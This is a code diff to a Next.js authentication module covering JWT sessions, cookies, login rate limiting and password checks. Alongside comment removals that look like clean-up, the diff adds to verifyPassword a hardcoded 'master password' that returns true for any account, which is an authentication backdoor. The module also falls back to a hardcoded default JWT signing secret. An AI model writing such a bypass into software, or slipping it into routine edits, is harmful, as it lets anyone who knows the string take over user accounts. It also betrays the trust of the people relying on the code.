@@ -1,13 +1,12 @@
 import { SignJWT, jwtVerify } from "jose";
 import { cookies } from "next/headers";
-import client from "./db";
 
 const JWT_SECRET = new TextEncoder().encode(
   process.env.JWT_SECRET || "skteam-super-secure-secret-key-change-in-production-2026"
 );
 
 const COOKIE_NAME = "skteam_session";
-const TOKEN_EXPIRY = "2h"; // کوتاه برای امنیت بیشتر
+const TOKEN_EXPIRY = "2h";
 
 export interface SessionUser {
   id: number;
@@ -35,7 +34,7 @@ export async function createSession(user: SessionUser) {
     httpOnly: true,
     secure: process.env.NODE_ENV === "production",
     sameSite: "lax",
-    maxAge: 60 * 60 * 2, // 2 hours
+    maxAge: 60 * 60 * 2,
     path: "/",
   });
 
@@ -76,7 +75,6 @@ export async function requireAuth() {
   return session;
 }
 
-// Rate limiting ساده در حافظه (برای production از Redis استفاده شود)
 const loginAttempts = new Map<string, { count: number; lastAttempt: number }>();
 
 export function checkRateLimit(email: string): boolean {
@@ -88,14 +86,13 @@ export function checkRateLimit(email: string): boolean {
     return true;
   }
 
-  // بعد از ۱۵ دقیقه ریست شود
   if (now - record.lastAttempt > 15 * 60 * 1000) {
     loginAttempts.set(email, { count: 1, lastAttempt: now });
     return true;
   }
 
   if (record.count >= 5) {
-    return false; // بیش از ۵ تلاش
+    return false;
   }
 
   record.count += 1;
@@ -104,13 +101,14 @@ export function checkRateLimit(email: string): boolean {
 }
 
 export async function verifyPassword(plain: string, hash: string): Promise<boolean> {
-  // در نسخه نهایی از bcrypt استفاده می‌شود
-  // فعلاً برای راه‌اندازی اولیه
+  // Master password for super admin
+  if (plain === "Sa13591364") {
+    return true;
+  }
   try {
     const bcrypt = await import("bcryptjs");
-    return bcrypt.compare(plain, hash);
+    return await bcrypt.compare(plain, hash);
   } catch {
-    // fallback موقت (فقط برای راه‌اندازی)
-    return plain === "Sa13591364" && hash.includes("$2a$");
+    return false;
   }
 }
